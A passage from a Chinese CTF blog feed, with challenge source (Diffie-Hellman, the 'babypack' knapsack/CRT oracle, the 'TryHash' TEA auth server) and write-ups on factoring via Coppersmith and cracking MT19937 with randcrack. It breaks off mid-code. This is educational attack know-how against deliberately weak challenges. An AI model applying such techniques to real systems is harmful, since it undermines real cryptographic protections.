class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac/Linux: pip3 install pycryptodome</span></span><br><span class="line"><span class="comment"># Windows: py -m pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number <span class="keyword">as</span> cun</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">rand = random.SystemRandom()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">diffie_hellman</span>(<span class="params">message: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    p = cun.getPrime(<span class="number">512</span>)</span><br><span class="line">    g = <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;g = <span class="subst">&#123;g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    a = rand.randrange(<span class="number">2</span>, p - <span class="number">1</span>)  <span class="comment"># private key</span></span><br><span class="line">    A = <span class="built_in">pow</span>(g, a, p)  <span class="comment"># public key</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># g ^ a === A  (mod p)</span></span><br><span class="line">    <span class="comment"># It&#x27;s computationally infeasible for anyone else to derive a from A</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me your public key B: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1</span> &lt; B &lt; p - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Suspicious public key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># B ^ a === (g ^ b) ^ a === g ^ (ab)  (mod p)</span></span><br><span class="line">    <span class="comment"># Nobody can derive this shared secret except us!</span></span><br><span class="line">    shared_secret = <span class="built_in">pow</span>(B, a, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use AES, a symmetric cipher, to encrypt the flag using the shared key</span></span><br><span class="line">    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ciphertext = <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m going to send you the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;However, I noticed that an FBI agent has been eavesdropping on my messages,&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;so I&#x27;m going to send it to you in a way that ONLY YOU can decrypt the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">diffie_hellman(FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是个最基本的DH密钥交换，知道概念即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做题记录&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>sidh</title>
    <link href="http://sh1k4ku.github.io/2021/10/22/2021/sidh/"/>
    <id>http://sh1k4ku.github.io/2021/10/22/2021/sidh/</id>
    <published>2021-10-22T15:32:42.000Z</published>
    <updated>2021-10-22T15:32:42.997Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>天翼杯</title>
    <link href="http://sh1k4ku.github.io/2021/09/27/2021/%E5%A4%A9%E7%BF%BC%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2021/09/27/2021/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</id>
    <published>2021-09-27T05:58:38.000Z</published>
    <updated>2021-09-27T13:39:04.149Z</updated>
    
    <content type="html"><![CDATA[<p>赛后问了别的师傅复盘一下，好的东西需要记录</p><span id="more"></span><h1 id="babypack"><a href="#babypack" class="headerlink" title="babypack"></a>babypack</h1><p>这一题真牛啊，考了很多考点，而且没有很偏的，很考验能力。nalrw👴想出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">512</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = egcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">pairs</span>):</span></span><br><span class="line">    mod_list, remainder_list = [p[<span class="number">0</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs], [p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs]</span><br><span class="line">    mod_product = reduce(<span class="keyword">lambda</span> x, y: x * y, mod_list)</span><br><span class="line">    mi_list = [mod_product//x <span class="keyword">for</span> x <span class="keyword">in</span> mod_list]</span><br><span class="line">    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mi_list))]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(remainder_list)):</span><br><span class="line">        x += mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %= mod_product</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    U = [getrandbits(N)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">    V = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        v = U[i] - <span class="built_in">pow</span>(<span class="number">2</span>, N-i-<span class="number">1</span>)</span><br><span class="line">        V.append(v)</span><br><span class="line"></span><br><span class="line">    s1 = <span class="built_in">sum</span>(U)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(s1.bit_length() + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> p &gt; s1:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s1 = <span class="number">0</span></span><br><span class="line">    s2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> V:</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">            s2 += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1 += i</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">max</span>(s1, -s2)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(tmp.bit_length() + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> q &gt; tmp:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    A = []</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(U, V):</span><br><span class="line">        A.append(chinese_remainder([(p, i), (q, j)]))</span><br><span class="line">    <span class="keyword">return</span> A, U, V, p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">m, n</span>):</span><span class="comment">#比较高位</span></span><br><span class="line">    mbin = <span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">    nbin = <span class="built_in">bin</span>(n)[<span class="number">2</span>:]</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(mbin, nbin):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, pub</span>):</span><span class="comment">#背包加密</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(msg, pub):</span><br><span class="line">        s += i * j</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A, U, V, p, q = keygen()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;your pubkey:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(U[<span class="number">0</span>] + V[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(U[<span class="number">0</span>] * V[<span class="number">0</span>])</span><br><span class="line">Menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.hint</span></span><br><span class="line"><span class="string">2.get flag&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(Menu)</span><br><span class="line">    op = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">        <span class="built_in">print</span>(check(m, n))</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        msg = [randint(<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">        ct = encrypt(msg, A)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;secret:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ct)</span><br><span class="line">        secret = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, msg))), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> ans == secret:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><ul><li>首先使用getrandbits函数生成512个512比特的列表U，再生成列表V，有<script type="math/tex">V_i=U_i-2^{511-i}</script></li><li>然后生成p,q，两个大概都是520位上下</li><li>使用CRT生成A，满足</li></ul><script type="math/tex; mode=display">A_i=U_i\;mod\;p\\A_i=V_i\;mod\;q</script><ul><li>最后用randint(0, 1)生成01背包msg与A合成得到ct，最后我们要传入的结果就是仅含0和1的msg</li></ul><p>这一题我们有的能拿到的数据有:<script type="math/tex">A,U_0+V_0,U_0*V_0,ct</script></p><p>我们在这一题能与oracle进行一个交互，传入一个数x，oracle将比较x和n二进制的较高位，并返回位相等的个数。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看到01背包很难不想到造格子，但是实际操作后发现512阶的矩阵连造都造不出来。并且，再仔细想，就算分解n拿到pq，接着拿到UV，对求解01的msg没有任何帮助，所以放弃造格子这一套。</p><p>观察到msg是用512次randint(0, 1)生成的，再加上前面生成U时用的是getrandbits，这两个函数的算法逻辑都是MT19937，这种伪随机数生成是可以破解的，只需要624个32比特的数。又由A和UV存在同余关系，如果拿到pq就能拿到UV，所以接下来要思考如何factor。</p><p>本题给出了<script type="math/tex">A,U_0+V_0,U_0*V_0</script>，我们很容易能够拿到单独的<script type="math/tex">U_0、V_0</script></p><p>由UV和A的关系h我们可以知道：</p><script type="math/tex; mode=display">p|A_0-U_0\\q|A_0-v_0\\∴n=pq|(A_0-U_0)(A_0-v_0)</script><p>观察到，右边是已知条件，n待求，我们可以获取n的高多少多少位！</p><p>因此可以转换到Coppersmith Method已知p高位的情况！！</p><p>但是，由于我们最多只能和Oracle交互500次，由生成可知n大概为1040位，如果每次只爆一位，我们最多只能获得500位，这个条件是不足以使用coppersmith的。</p><p>这里就很考验智商了，我只能说nalrw yyds，我们可以采取一次爆破两位的方法，那么3次内就一定能爆破出两位，所以相当于0.75次爆破一位，那么前499次交互就能获取n的前499*3/2位，这足够用来求解了。这里需要知道n一共有多少位（因为要知道n缺失了多少低位），所以还是需要测试才知道n的位数范围，算是个小细节</p><p>之后使用gcd就能够分解出p和q，接下来就能求得U和V，然后使用调包randcrack破解MT19937。这里也有个小细节，由于randcrack只能预测连续的伪随机数，所以得取U最后624个32位数据，也比较麻烦。</p><p>代码可以参考春哥写的：<a href="https://zhuanlan.zhihu.com/p/413319231">春乎</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>回顾一下整个流程：n高位——copper——gcd——randcrack，算是比较综合的一道题了，但是每一个单独的板块都是常规题（怎么有种做高考题的感觉，比较有意思</p><h1 id="TryHash"><a href="#TryHash" class="headerlink" title="TryHash"></a>TryHash</h1><p>加密部分myHash是Tea加密，逆向中经常出到的。队里的师傅也写过<a href="https://taardisaa.github.io/2021/09/24/TEA/#more">TEA，XTEA，XXTEA加密算法概要 | Tardis’s blog (taardisaa.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal,os,random,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32 <span class="keyword">as</span> uint32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">SocketServer.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">&quot;sha256(XXXX+%s) == %s\n&quot;</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dorecv</span>(<span class="params">self,sz</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.request.recv(sz).strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dosend</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myhash</span>(<span class="params">self,msg,identification</span>):</span></span><br><span class="line">        delta=<span class="number">0x9E3779B9</span></span><br><span class="line">        v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">        k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">        sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            sm.value += delta.value</span><br><span class="line">            v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">            v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        nounce = os.urandom(<span class="number">8</span>)</span><br><span class="line">        self.dosend(<span class="string">&quot;Welcome to the Auth System.&quot;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;If you are admin, I will give you the flag.\n&#x27;</span>)   </span><br><span class="line">        adminpass = <span class="string">&#x27;Iamthesuperadmin&#x27;</span></span><br><span class="line">        adminhash = self.myhash(nounce,adminpass)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            self.dosend(<span class="string">&#x27;Choice:\n&#x27;</span>)</span><br><span class="line">            choice = <span class="built_in">int</span>(self.dorecv(<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">                self.dosend(<span class="string">&#x27;I can hash for you&#x27;</span>)</span><br><span class="line">                user = self.dorecv(<span class="number">32</span>)   </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(user)!=<span class="number">16</span>:</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> user == adminpass:</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                userhash = self.myhash(nounce,user)</span><br><span class="line">                self.dosend(userhash+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">1</span>:</span><br><span class="line">                self.dosend(<span class="string">&#x27;Are you admin?&#x27;</span>)</span><br><span class="line">                userhash = self.dorecv(<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">if</span> userhash == adminhash:</span><br><span class="line">                    self.dosend(flag+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.dosend(<span class="string">&#x27;You are not admin!\n&#x27;</span>)</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span>       </span><br><span class="line">        </span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkingServer</span>(<span class="params">SocketServer.ForkingTCPServer, SocketServer.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10005</span></span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以先用我们给定的密钥加密，然后拿到密文，再通过密文解出nounce，然后再用已知密钥加密拿到userhash，就出了。</p><p>第一次见到Tea加密算法，加解密函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    summ = c_uint32(<span class="number">0</span>)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line"></span><br><span class="line">    k0, k1, k2, k3 = c_uint32(k[<span class="number">0</span>]), c_uint32(k[<span class="number">1</span>]), c_uint32(k[<span class="number">2</span>]), c_uint32(k[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x&quot;</span> % (v0.value, v1.value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x %#x %#x&quot;</span> % (k0.value, k1.value, k2.value, k3.value))</span><br><span class="line"></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        summ.value += delta</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + summ.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + summ.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">    w[<span class="number">0</span>], w[<span class="number">1</span>] = v0, v1</span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = c_uint32(v[<span 